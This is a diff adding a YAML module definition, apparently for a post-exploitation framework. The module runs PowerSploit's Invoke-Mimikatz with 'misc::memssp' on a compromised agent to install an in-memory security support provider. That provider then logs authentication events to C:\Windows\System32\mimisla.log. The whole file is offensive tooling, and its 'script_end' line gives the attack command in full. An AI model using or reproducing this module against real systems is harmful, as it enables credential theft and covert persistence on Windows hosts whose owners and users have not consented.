@@ -1,0 +1,30 @@
+name: Invoke-Mimikatz memssp
+authors:
+  - name: Joseph Bialek
+    handle: '@JosephBialek'
+    link: https://twitter.com/JosephBialek
+  - name: Benjamin Delpy
+    handle: '@gentilkiwi'
+    link: https://twitter.com/gentilkiwi
+description: Runs PowerSploit's Invoke-Mimikatz function to execute misc::memssp to log all authentication events to C:\Windows\System32\mimisla.log.
+software: S0194
+tactics: []
+techniques:
+  - T1101
+background: true
+output_extension:
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - http://clymb3r.wordpress.com/
+  - http://blog.gentilkiwi.com
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+script_path: credentials/Invoke-Mimikatz.ps1
+script_end: Invoke-Mimikatz -Command '"misc::memssp"'; 'memssp installed, check C:\Windows\System32\mimisla.log for logon
+  events.'
